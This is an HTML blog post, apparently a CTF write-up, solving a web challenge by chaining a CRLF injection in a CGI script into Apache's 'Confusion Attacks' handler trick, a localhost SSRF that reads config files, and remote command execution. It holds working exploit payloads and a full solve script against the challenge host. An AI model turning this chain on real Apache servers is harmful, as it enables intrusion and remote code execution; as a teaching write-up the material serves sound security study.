@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gr4ktung | C0nfused Surfing (Web) Walkthrough</title>
+    <meta name="description" content="C0nfused Surfing — Full writeup of the dirtbags & flags CTF 2026 web challenge. Apache Confusion Attacks (Orange Tsai) chained to RCE.">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../style.css">
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <nav>
+        <div class="logo"><a href="../../../index.html">gr4ktung</a></div>
+        
+        <div class="search-container">
+            <span class="search-prompt">gr4ktung@blog:~$ grep</span>
+            <input type="text" id="site-search" placeholder="..." autocomplete="off">
+        </div>
+
+        <div class="nav-links">
+            <a href="../../../about.html">~/about</a>
+            <a href="../../../blog.html" class="active">~/posts</a>
+            <a href="../../../achievements.html">~/achievements</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="writeup-layout">
+            
+            <aside class="sidebar">
+                <h4>MISSION_BRIEF</h4>
+                <div class="intel-grid">
+                    <div class="detail-box">
+                        <span class="label">Target</span>
+                        <span class="value">C0nfused Surfing</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Category</span>
+                        <span class="value">Web</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Event</span>
+                        <span class="value">dirtbags & flags 2026</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Difficulty</span>
+                        <span class="value" style="color: #ffb83e;">Hard</span>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <span class="tag">CRLF</span>
+                    <span class="tag">Confusion Attack</span>
+                    <span class="tag">SSRF</span>
+                    <span class="tag">RCE</span>
+                </div>
+            </aside>
+
+            <article class="blog-content">
+                <h1>C0nfused Surfing — Full Writeup</h1>
+                <div class="blog-meta">
+                    > Published: August 31, 2026 | ⏱ 12 min read | Author: gr4ktung
+                </div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <div class="card" style="border-left: 3px solid #00ff41; background: rgba(0, 255, 65, 0.05); margin-bottom: 30px;">
+                    <p style="margin: 0; line-height: 1.6;">
+                        <span style="color: #00ff41; font-weight: bold;">[!] INTEL_UPDATE:</span><br>
+                        I was playing <span style="color: #00ff41;"><strong>dirtbags & flags CTF 2026</strong></span> and I got the <span style="color: #00ff41;"><strong>12th position out of 479</strong></span> under the alias <span style="color: #00ff41;"><strong>gr4ktung</strong></span>.
+                    </p>
+                </div>
+
+                <p><strong>Category:</strong> Web<br>
+                <strong>Target:</strong> <code>https://d095f97642da70d3.live.sbhost.io</code><br>
+                <strong>Vulnerability class:</strong> Apache "Confusion Attacks" (Orange Tsai, Black Hat 2024) — RCE via a CRLF injection chained into a <code>mod_cgi</code> server-side redirect that triggers a <code>mod_proxy</code> (SSRF) handler, then a second SSRF through the localhost CGI proxy.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <img src="../../metactf/dirtbag-ctf_2026/images/chall.png" alt="Challenge Interface" class="content-img">
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>1. The challenge source</h3>
+                <p>Everything runs inside one Apache 2.4.54 container (<code>php:7.4-apache</code>). Two CGI scripts under <code>/usr/lib/cgi-bin/</code>:</p>
+
+                <h4> <code>cgi-bin/admin</code> — command execution behind a token</h4>
+                <div class="command-block" style="white-space: pre-wrap;">SECRET_TOKEN = getenv('SECRET')
+form = cgi.FieldStorage()
+token = form.getvalue("token")
+command = form.getvalue("command")
+if token == SECRET_TOKEN:
+    if command:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+    else:
+        print("Location: /")
+else:
+    # Fix this
+    print(f"Location: /error?msg=Invalid {token}")     # &lt;-- CRLF injection
+print("Content-Type: text/html\n")
+print()
+if result:
+    print(result)</div>
+                <p>If the token matches, it executes any shell command as <code>www-data</code>. The flag lives in <code>/root/flag.txt</code> (0600 root, and <code>/root</code> isn't traversable by <code>www-data</code>), only readable through the <strong>setuid-root</strong> helper <code>/FLAG_&lt;random8&gt;</code> compiled from <code>getflag.c</code>.</p>
+
+                <h4> <code>cgi-bin/proxy</code> — SSRF, restricted to localhost</h4>
+                <div class="command-block" style="white-space: pre-wrap;">form = cgi.FieldStorage()
+location = form.getvalue('location')
+print("Content-Type: text/html\n")
+print()
+try:
+    print(urlopen(location).read().decode())
+except Exception as e:
+    print(f"Error: {e}")</div>
+                <p>Python <code>urllib.request.urlopen()</code> → full SSRF (including <code>file://</code>).</p>
+
+                <h4> <code>apache2.conf</code> — the wall in front of proxy</h4>
+                <div class="command-block" style="white-space: pre-wrap;">SetEnv SECRET SuperSecretToken            # local value only; live instance randomizes it
+&lt;Location "/cgi-bin/proxy"&gt;
+    Order deny,allow
+    Deny from all
+    Allow from 127.0.0.1
+    Allow from ::1
+&lt;/Location&gt;</div>
+
+                <p>So:</p>
+                <ul>
+                    <li><code>/cgi-bin/admin</code> reachable externally, token unknown on live.</li>
+                    <li><code>/cgi-bin/proxy</code> only reachable from <code>127.0.0.1</code>, and we can only talk to the server remotely.</li>
+                </ul>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>2. Recon that mattered</h3>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>2.1 Local environment</h4>
+                <p><code>docker-compose.yml</code> runs the challenge locally on port <code>5000</code> with the <strong>fake</strong> flag.</p>
+                <div class="command-block" style="white-space: pre-wrap;">docker ps</div>
+                <div class="command-block" style="white-space: pre-wrap;">curl -s http://127.0.0.1:5000/</div>
+
+                <h4>2.2 Baseline checks (local)</h4>
+                <div class="command-block" style="white-space: pre-wrap;">curl -s "http://127.0.0.1:5000/cgi-bin/admin?token=SuperSecretToken&amp;command=ls+/"</div>
+
+                <img src="../../metactf/dirtbag-ctf_2026/images/docker-localhost.png" alt="Challenge Interface" class="content-img">
+
+                <div class="command-block" style="white-space: pre-wrap;">curl -s -i "http://127.0.0.1:5000/cgi-bin/admin"</div>
+                <div class="command-block" style="white-space: pre-wrap;">curl -s -i "http://127.0.0.1:5000/cgi-bin/proxy?location=http://127.0.0.1/"</div>
+
+                <blockquote>Note: connecting to <code>127.0.0.1:5000</code> from the host does <strong>not</strong> make Apache see <code>127.0.0.1</code>. Docker DNATs the connection, so Apache sees the docker bridge gateway (e.g. <code>172.17.0.1</code>). That is why even "localhost" requests get the proxy 403 locally.</blockquote>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>2.3 Live recon</h4>
+                <div class="command-block" style="white-space: pre-wrap;">T="d095f97642da70d3.live.sbhost.io"</div>
+                <div class="command-block" style="white-space: pre-wrap;">curl -s -o /dev/null -w "%{http_code}\n" "https://$T/cgi-bin/proxy"</div>
+                <img src="../../metactf/dirtbag-ctf_2026/images/live-testing(1).png" alt="Challenge Interface" class="content-img">
+                <img src="../../metactf/dirtbag-ctf_2026/images/live-testing(2).png" alt="Challenge Interface" class="content-img">
+                <div class="command-block" style="white-space: pre-wrap;">curl -s -i --max-time 20 "https://$T/cgi-bin/admin" \
+     --data-urlencode $'token=x\nX-Injected: yes'</div>
+                <img src="../../metactf/dirtbag-ctf_2026/images/admin-crlf-injection.png" alt="Challenge Interface" class="content-img">
+
+                <div class="command-block" style="white-space: pre-wrap;">curl -s -o /dev/null -w "%{http_code}\n" \
+     "https://$T/cgi-bin/admin?token=SuperSecretToken&amp;command=id"</div>
+
+                <p>Conclusion: admin + CRLF works externally, we don't know the token, and we can't reach proxy directly. The solve must chain them.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>3. Key vulnerability — Apache "Confusion Attacks"</h3>
+                <p>From Orange Tsai's research (CVE-2024-38475/38476/38477, "Confusion Attacks"):</p>
+
+                <p>When a CGI returns <code>Location: /path</code> with status 200, <code>mod_cgi</code> performs an <strong>internal server-side redirect</strong> (RFC 3875 §6.2.2). Crucially:</p>
+                <div class="command-block" style="white-space: pre-wrap;">if (r-&gt;handler)
+    ap_set_content_type(new, r-&gt;content_type);   // copies the CGI's Content-Type into the redirected request
+...
+access_status = ap_invoke_handler(new);          // handler chosen from that Content-Type</div>
+
+                <p>So if we can control the CGI <strong>response headers</strong> (we can, via the CRLF injection) we can make the internally-redirected request be handled by <strong><code>mod_proxy</code></strong> by setting:</p>
+                <div class="command-block" style="white-space: pre-wrap;">Content-Type: proxy:http://&lt;any-url&gt;/</div>
+                <p>→ Apache connects to <code>&lt;any-url&gt;</code> <strong>from the server itself (127.0.0.1)</strong>, bypassing the <code>Location /cgi-bin/proxy</code> ACL, and relays the full response back to us.</p>
+
+                <p>Local proof (the redirect target <code>/ooo</code> gets picked up by the <code>proxy:</code> handler and SSRF's <code>index.php</code>):</p>
+                <div class="command-block" style="white-space: pre-wrap;">docker exec $(docker ps -q) python3 -c "
+import urllib.parse, urllib.request
+tok = 'x\\r\\nLocation: /ooo\\r\\nContent-Type: proxy:http://127.0.0.1/index.php\\r\\n'
+url = 'http://127.0.0.1/cgi-bin/admin?' + urllib.parse.urlencode({'token': tok})
+r = urllib.request.urlopen(url, timeout=15)
+print(r.status); print(r.read().decode()[:200])
+"</div>
+
+                     <img src="../../metactf/dirtbag-ctf_2026/images/local-proof.png" alt="Challenge Interface" class="content-img">
+
+                <p>Verified two subtleties:</p>
+                <ol>
+                    <li>Our injected (second/last) <code>Location</code> header wins.</li>
+                    <li>Our injected <code>Content-Type: proxy:...</code> wins over admin's own <code>Content-Type: text/html</code>.</li>
+                </ol>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>4. Step-by-step local testing</h3>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>Step 4.1 — SSRF via admin CRLF -&gt; <code>mod_proxy</code> handler</h4>
+                <div class="command-block" style="white-space: pre-wrap;">C=$(docker ps -q)
+docker exec "$C" python3 -c "
+import urllib.parse, urllib.request
+tok = 'x\\r\\nLocation: /ooo\\r\\nContent-Type: proxy:http://127.0.0.1/index.php\\r\\n'
+url = 'http://127.0.0.1/cgi-bin/admin?' + urllib.parse.urlencode({'token': tok})
+r = urllib.request.urlopen(url, timeout=15)
+print(r.status)
+print(r.read().decode()[:120])
+"</div>
+                <p><code>X-Powered-By: PHP/7.4.33</code> in the response confirms mod_proxy actually fetched and served <code>/index.php</code>.</p>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>Step 4.2 — Chain to the localhost CGI proxy to read <code>file://</code></h4>
+                <p><code>mod_proxy</code> <strong>appends the redirected request's filename</strong> (<code>/var/www/html/ooo</code>) to the URL. We absorb that junk with a trailing <code>&amp;junk=</code> parameter so it becomes an unused query value.</p>
+                <div class="command-block" style="white-space: pre-wrap;">python3 - &lt;&lt;'EOF'
+import urllib.parse, urllib.request
+
+def crlf(token_raw):
+    url = "http://127.0.0.1:5000/cgi-bin/admin?" + urllib.parse.urlencode({"token": token_raw})
+    return urllib.request.urlopen(url, timeout=20).read().decode()
+
+loc  = "file:///etc/apache2/conf-enabled/servername.conf"
+inner = "http://127.0.0.1/cgi-bin/proxy?location=" \
+        + urllib.parse.quote(loc, safe="") + "&amp;junk="
+tok  = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+print(crlf(tok))
+EOF
+</div>
+
+                 <img src="../../metactf/dirtbag-ctf_2026/images/read-file-locally.png" alt="Challenge Interface" class="content-img">
+
+                <p>This proves: external request -&gt; admin CRLF -&gt; internal redirect -&gt; <code>Content-Type: proxy:</code> handler -&gt; <code>mod_proxy</code> connects to <code>127.0.0.1/cgi-bin/proxy</code> (ACL passes, source = 127.0.0.1) -&gt; python <code>urlopen("file:///etc/apache2/conf-enabled/servername.conf")</code> -&gt; file contents relayed back.</p>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>Step 4.3 — Discovered quirk: <code>mod_proxy</code> lowercases the query</h4>
+                <p>Trying to reach admin through the proxy for command execution produced only <code>Error: HTTP Error 404: Not Found</code>, despite the direct path working. A debug CGI pinpointed it:</p>
+                <div class="command-block" style="white-space: pre-wrap;">C=$(docker ps -q)
+docker exec "$C" sh -c 'cat &gt; /usr/lib/cgi-bin/debug &lt;&lt;"EOF"
+#!/bin/sh
+echo "Content-Type: text/plain"; echo
+echo "SECRET=[$SECRET]"; echo "QUERY=[$QUERY_STRING]"
+EOF
+chmod 755 /usr/lib/cgi-bin/debug'</div>
+
+                <div class="command-block" style="white-space: pre-wrap;">docker exec "$C" sh -c 'curl -s "http://127.0.0.1/cgi-bin/proxy?location=http%3A%2F%2F127.0.0.1%2Fcgi-bin%2Fdebug%3Ftoken%3DSuperSecretToken"'</div>
+                <div class="command-block" style="white-space: pre-wrap;">python3 - &lt;&lt;'EOF'
+import urllib.parse, urllib.request
+def crlf(tok_raw):
+    url = "http://127.0.0.1:5000/cgi-bin/admin?" + urllib.parse.urlencode({"token": tok_raw})
+    return urllib.request.urlopen(url, timeout=20).read().decode()
+loc = "http://127.0.0.1/cgi-bin/debug?token=SuperSecretToken"
+inner = "http://127.0.0.1/cgi-bin/proxy?location=" + urllib.parse.quote(loc, safe="") + "&amp;junk="
+tok  = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+print(crlf(tok))
+EOF
+</div>
+
+                 <img src="../../metactf/dirtbag-ctf_2026/images/uppercase.png" alt="Challenge Interface" class="content-img">
+
+                <p>That's why the token check failed (<code>token=SuperSecretToken</code> became <code>token=supersecrettoken</code>).</p>
+
+                <p><strong>Fix: percent-encode every byte</strong> of the inner target (<code>%xx</code> hex is all lowercase, so lowercasing is a no-op), and the proxy's <code>FieldStorage</code> decodes it back to the original mixed-case URL.</p>
+                <div class="command-block" style="white-space: pre-wrap;">def full_encode(s):
+    return "".join("%%%02x" % b for b in s.encode())</div>
+                <p>(<code>urllib.parse.quote</code> leaves letters unencoded — that's what was getting lowercased.)</p>
+
+                <p>Local verification with the fix:</p>
+                <div class="command-block" style="white-space: pre-wrap;">import urllib.parse, urllib.request
+def crlf(tok_raw):
+    url = "http://127.0.0.1:5000/cgi-bin/admin?" + urllib.parse.urlencode({"token": tok_raw})
+    return urllib.request.urlopen(url, timeout=20).read().decode()
+def full_encode(s):
+    return "".join("%%%02x" % b for b in s.encode())
+
+loc = "http://127.0.0.1/cgi-bin/debug?X=ABC&amp;Token=SuperSecretToken"
+inner = "http://127.0.0.1/cgi-bin/proxy?location=" + full_encode(loc) + "&amp;junk="
+tok  = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+</div>
+
+                
+
+                <h4>Step 4.4 — Full RCE locally through the chain</h4>
+                <div class="command-block" style="white-space: pre-wrap;">import urllib.parse, urllib.request
+
+def crlf(tok_raw):
+    url = "http://127.0.0.1:5000/cgi-bin/admin?" + urllib.parse.urlencode({"token": tok_raw})
+    return urllib.request.urlopen(url, timeout=20).read().decode()
+
+def full_encode(s):
+    return "".join("%%%02x" % b for b in s.encode())
+
+def run_cmd(cmd, secret="SuperSecretToken"):
+    target = "http://127.0.0.1/cgi-bin/admin?token=%s&amp;command=%s" % (secret, urllib.parse.quote(cmd))
+    inner  = "http://127.0.0.1/cgi-bin/proxy?location=" + full_encode(target) + "&amp;junk="
+    tok    = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+    return crlf(tok)
+
+print(run_cmd("id"))
+print(run_cmd("ls /"))
+print(run_cmd("/FLAG_nnfzvThj"))</div>
+
+                     <img src="../../metactf/dirtbag-ctf_2026/images/local-rce.png" alt="Challenge Interface" class="content-img">
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>5. Exploitation on the live server</h3>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>Step 5.1 — Read the Apache config to recover the per-instance SECRET</h4>
+                <p>The <code>SetEnv SECRET</code> line lives in <code>/etc/apache2/conf-enabled/servername.conf</code>; the <code>file://</code> read through the proxy leaks it.</p>
+                <div class="command-block" style="white-space: pre-wrap;">python3 - &lt;&lt;'EOF'
+import urllib.parse, urllib.request, urllib.error, ssl
+ctx = ssl._create_unverified_context()
+HOST = "https://d095f97642da70d3.live.sbhost.io"
+
+def crlf(tok_raw):
+    url = HOST + "/cgi-bin/admin?" + urllib.parse.urlencode({"token": tok_raw})
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"}), timeout=25, context=ctx)
+        return r.read().decode(errors="replace")
+    except urllib.error.HTTPError as e:
+        return e.read().decode(errors="replace")
+
+loc = "file:///etc/apache2/conf-enabled/servername.conf"
+inner = "http://127.0.0.1/cgi-bin/proxy?location=" + urllib.parse.quote(loc, safe="") + "&amp;junk="
+tok  = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+print(crlf(tok))
+EOF</div>
+                <p>Output (leaked secret):</p>
+                <div class="command-block" style="white-space: pre-wrap;">ServerName ConfusedSurfing
+SetEnv SECRET yVrWyoipmMDJB5
+&lt;Location "/cgi-bin/proxy"&gt; ...</div>
+
+                     <img src="../../metactf/dirtbag-ctf_2026/images/live-token.png" alt="Challenge Interface" class="content-img">
+
+                <p>The live instance <strong>randomizes</strong> SECRET per deployment — that's why <code>SuperSecretToken</code> always failed.</p>
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+                <h4>Step 5.2 — RCE through the proxy using the leaked token</h4>
+                <p>Same chain, but the target of the inner SSRF is the admin CGI with the real token. The token is byte-percent-encoded so <code>mod_proxy</code>'s lowercasing doesn't damage it.</p>
+                <div class="command-block" style="white-space: pre-wrap;">python3 - &lt;&lt;'EOF'
+import urllib.parse, urllib.request, urllib.error, ssl
+ctx = ssl._create_unverified_context()
+HOST   = "https://d095f97642da70d3.live.sbhost.io"
+SECRET = "yVrWyoipmMDJB5"
+
+def crlf(tok_raw):
+    url = HOST + "/cgi-bin/admin?" + urllib.parse.urlencode({"token": tok_raw})
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"}), timeout=25, context=ctx)
+        return r.read().decode(errors="replace")
+    except urllib.error.HTTPError as e:
+        return e.read().decode(errors="replace")
+
+def full_encode(s):
+    return "".join("%%%02x" % b for b in s.encode())
+
+def run_cmd(cmd):
+    target = "http://127.0.0.1/cgi-bin/admin?token=%s&amp;command=%s" % (SECRET, urllib.parse.quote(cmd))
+    inner  = "http://127.0.0.1/cgi-bin/proxy?location=" + full_encode(target) + "&amp;junk="
+    tok    = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+    return crlf(tok)
+
+print(run_cmd("id"))
+print(run_cmd("ls -la /"))
+EOF</div>
+                <p><code>ls -la /</code> shows the setuid flag-reader:</p>
+                <div class="command-block" style="white-space: pre-wrap;">-rwsr-xr-x. 1 root root 16864 Jul 19 14:01 FLAG_NGpFllcO</div>
+
+                 <img src="../../metactf/dirtbag-ctf_2026/images/live-rce-flag.png" alt="Challenge Interface" class="content-img">
+
+                <h4>Step 5.3 — Get the flag</h4>
+                <div class="command-block" style="white-space: pre-wrap;">print(run_cmd("/FLAG_NGpFllcO"))</div>
+
+                 <img src="../../metactf/dirtbag-ctf_2026/images/live-flag.png" alt="Challenge Interface" class="content-img">
+
+                <p>Output:</p>
+                <div style="text-align: center; margin-top: 20px;">
+                    <div class="flag-block">MetaCTF{0R4NG3_7S4I_57uDen7_4w2345adcs4}</div>
+                </div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>6. Complete solve script</h3>
+                <div class="command-block" style="white-space: pre-wrap;">python3 - &lt;&lt;'EOF'
+import re
+import ssl
+import urllib.error
+import urllib.parse
+import urllib.request
+
+TARGET = "https://d095f97642da70d3.live.sbhost.io"
+CTX    = ssl._create_unverified_context()
+
+
+def req(url):
+    r = urllib.request.urlopen(
+        urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}),
+        timeout=30, context=CTX)
+    return r.read().decode(errors="replace")
+
+
+def full_encode(s):
+    return "".join("%%%02x" % b for b in s.encode())
+
+
+def ssrf(loc):
+    inner = "http://127.0.0.1/cgi-bin/proxy?location=" + full_encode(loc) + "&amp;junk="
+    tok   = "x\r\nLocation: /ooo\r\nContent-Type: proxy:" + inner + "\r\n"
+    q     = urllib.parse.urlencode({"token": tok})
+    return req(TARGET + "/cgi-bin/admin?" + q)
+
+
+def read_file(path):
+    return ssrf("file://" + path)
+
+
+def run_cmd(secret, cmd):
+    target = "http://127.0.0.1/cgi-bin/admin?token=%s&amp;command=%s" % (secret, urllib.parse.quote(cmd))
+    return ssrf(target)
+
+
+conf = read_file("/etc/apache2/conf-enabled/servername.conf")
+print("[+] servername.conf leaked:\n" + conf)
+m = re.search(r"SetEnv SECRET (\S+)", conf)
+if not m:
+    raise SystemExit("[-] SECRET not found")
+secret = m.group(1)
+print("[+] SECRET =", secret)
+
+out = run_cmd(secret, "ls -la /")
+print("[+] ls -la /:\n" + out)
+names = re.findall(r"/FLAG_[A-Za-z0-9]+", out + "\n")
+if not names:
+    names = [l.split()[-1] for l in out.splitlines() if "FLAG_" in l]
+if not names:
+    raise SystemExit("[-] flag binary not found")
+binname = names[0]
+print("[+] flag binary:", binname)
+
+flag = run_cmd(secret, binname)
+print("[+] FLAG:", flag.strip())
+EOF</div>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <p><strong>Flag:</strong> <code>MetaCTF{0R4NG3_7S4I_57uDen7_4w2345adcs4}</code> — a nod to Orange Tsai's Apache Confusion Attacks, exactly the technique used here.</p>
+
+                <div class="post-nav" style="margin-top: 40px;">
+                    <a href="../../../../blog.html" class="btn">RETURN_TO_DIR</a>
+                </div>
+            </article>
+
+            <aside class="sidebar" style="background: transparent; border: none; padding: 0;">
+                <h4 style="padding-left: 20px;">RELATED_INTEL FROM DIRTBAGS &amp; FLAGS 2026</h4>
+                <div class="staggered-links">
+                    <a href="../metactf/c0nfused-surfing.html" class="stagger-link">Web: C0nfused Surfing</a>
+                </div>
+            </aside>
+
+        </div>
+    </main>
+
+    <footer>
+        <p>sys.exit(0) | Designed by gr4ktung </p>
+    </footer>
+
+    <div class="scroll-controls">
+        <button class="scroll-btn" id="scroll-to-top">↑</button>
+        <button class="scroll-btn" id="scroll-to-bottom">↓</button>
+    </div>
+
+    <script src="../../../script.js"></script>
+</body>
+</html>
